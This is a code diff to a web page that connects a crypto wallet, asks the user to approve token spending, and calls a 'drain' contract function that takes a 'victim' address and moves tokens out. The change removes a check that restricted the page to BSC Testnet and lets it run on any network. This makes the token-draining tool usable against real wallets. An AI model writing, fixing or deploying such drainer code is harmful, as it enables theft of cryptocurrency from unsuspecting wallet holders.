@@ -14,7 +14,7 @@
 <button onclick="drain()">Drain Tokens</button>
 
 <script>
-let provider, signer;
+let provider, signer, userAddress;
 
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
@@ -28,7 +28,14 @@ const drainABI = [
   "function drain(address token, address victim, uint256 amount) public"
 ];
 
-// CONNECT (no forced network switch)
+// 🔁 Handle network change safely
+if (window.ethereum) {
+  window.ethereum.on("chainChanged", () => {
+    console.log("Network changed");
+  });
+}
+
+// CONNECT
 async function connect() {
   try {
     if (!window.ethereum) {
@@ -36,24 +43,21 @@ async function connect() {
       return;
     }
 
-    // 🔴 IMPORTANT: user must already be on BSC Testnet
-    const chainId = await window.ethereum.request({ method: "eth_chainId" });
-
-    if (chainId !== "0x61") {
-      alert("⚠️ Switch to BSC Testnet manually first");
-      return;
-    }
-
     await window.ethereum.request({ method: "eth_requestAccounts" });
 
+    // ✅ Use "any" to allow network switching
     provider = new ethers.providers.Web3Provider(window.ethereum, "any");
     signer = provider.getSigner();
 
-    const address = await signer.getAddress();
+    // Sync network
+    await provider.getNetwork();
 
-    alert("✅ Connected: " + address);
+    userAddress = await signer.getAddress();
+
+    alert("✅ Connected: " + userAddress);
 
   } catch (e) {
+    console.error(e);
     alert("❌ Connect error: " + e.message);
   }
 }
@@ -66,6 +70,9 @@ async function approve() {
       return;
     }
 
+    // 🔥 Re-sync network before tx
+    await provider.getNetwork();
+
     const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
     const tx = await contract.approve(
@@ -75,9 +82,10 @@ async function approve() {
 
     await tx.wait();
 
-    alert("✅ Approved");
+    alert("✅ Approved successfully");
 
   } catch (e) {
+    console.error(e);
     alert("❌ Approve error: " + e.message);
   }
 }
@@ -89,6 +97,9 @@ async function drain() {
       alert("Connect wallet first");
       return;
     }
+
+    // 🔥 Re-sync network before tx
+    await provider.getNetwork();
 
     const contract = new ethers.Contract(drainAddress, drainABI, signer);
 
@@ -103,6 +114,7 @@ async function drain() {
     alert("💣 Drain executed");
 
   } catch (e) {
+    console.error(e);
     alert("❌ Drain error: " + e.message);
   }
 }
